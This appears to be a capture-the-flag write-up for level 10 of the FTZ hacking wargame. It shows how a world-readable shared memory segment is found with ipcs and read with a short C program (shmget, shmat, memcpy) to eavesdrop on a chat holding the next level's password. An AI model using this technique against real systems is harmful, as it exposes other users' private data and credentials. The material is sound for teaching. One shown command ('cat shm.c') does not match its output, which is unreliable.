# Level10

## This level's goal

- Share memory
- shmget(), shmat(), shmdt() function

***

```
[level10@ftz level10]$ cat hint
두명의 사용자가 대화방을 이용하여 비밀스런 대화를 나누고 있다.
(Two users are having a secret converstation using a chat room.)
그 대화방은 공유 메모리를 이용하여 만들어졌으며, key_t의 값은 7530이다. 
(The chat room was created using share memory, the value of key_t is 7530)
이를 이용해 두 사람의 대화를 도청하여 level11의 권한을 얻어라.
( Use this to eavesdrop on conversations between two users to get level11's privilege)

- 레벨을 완료하셨다면 소스는 지우고 나가주세요.
( if you completed the level, please delete the source and exit. )
```
```
[level10@ftz level10]$ find / -user level11 -perm -4000 2>/dev/null

[level10@ftz level10]$ find / -type f -exec egrep -l /home/level10/program {} \; 2>/dev/null
/proc/4583/cmdline
/etc/HackMe/AUTO_SCRIPT/auto_script.sh
/etc/HackMe/ETC/rc.local
/etc/rc.d/rc.local

[level10@ftz level10]$ cat /etc/rc.d/rc.local
#!/bin/sh
#
# This script will be executed *after* all the other init scripts.
# You can put your own initialization stuff in here if you don't
# want to do the full Sys V style init stuff.

touch /var/lock/subsys/local

# setting hostname
hostname ftz.hackerschool.org

# run web server
/etc/init.d/httpd start

# open level4 port
cp /bin/ls /home/level4/tmp/backdoor
chown level4.level4 /home/level4/tmp/backdoor
/etc/init.d/xinetd restart
rm -rf /home/level4/tmp/backdoor

# run level10
/home/level10/program/level10

# get ip
#dhclient eth0

[level10@ftz level10]$ ps -ef | grep level10
level10   4531  4530  0 14:56 pts/0    00:00:00 -bash
level10  19519  4531  0 15:09 pts/0    00:00:00 ps -ef
level10  19520  4531  0 15:09 pts/0    00:00:00 grep level10
```
/home/level10/program/level10 seems to be executed once and finished in the form of a normal process (not demon mode)

```
[level10@ftz level10]$ ipcs

------ Shared Memory Segments --------
key        shmid      owner      perms      bytes      nattch     status
0x00001d6a 0          root      666        1028       0
```
0x00001d6a means 7530 in decimal (this is the key in the hint)   
you need to make a file to get share memory(the value of key is 7530)
```
[level10@ftz tmp]$ cat shm.c
#include <stdio.h>
#include <unistd.h>
#include <sys/ipc.h>
#include <sys/shm.h>

#define BUFFSIZE 1024
#define KEY 7530

int main()
{
        int shm_id;
        void *shm_addr=(void *)0;
        char buf[BUFFSIZE];

        // shmget() : Creates share memory
        // key_t key : the key variable for reading share memory
        // (int size) : memory size
        // 0666 : share memory permission
        shm_id = shmget(KEY, BUFFSIZE, 0666);

        // shmat() : Attach the created share memory
        shm_addr = shmat(shm_id, (void *)0, 0);
        
        // memcpy() : Copy the value of memory
        memcpy(buf, shm_addr, BUFFSIZE);
        printf("%s", buf);

        // shmdt() : Detach the connected share memory
        shmdt(shm_addr);

        return 0;
}

[level10@ftz tmp]$ cat shm.c

멍멍: level11의 패스워드는?
구타: what!@#$?
```
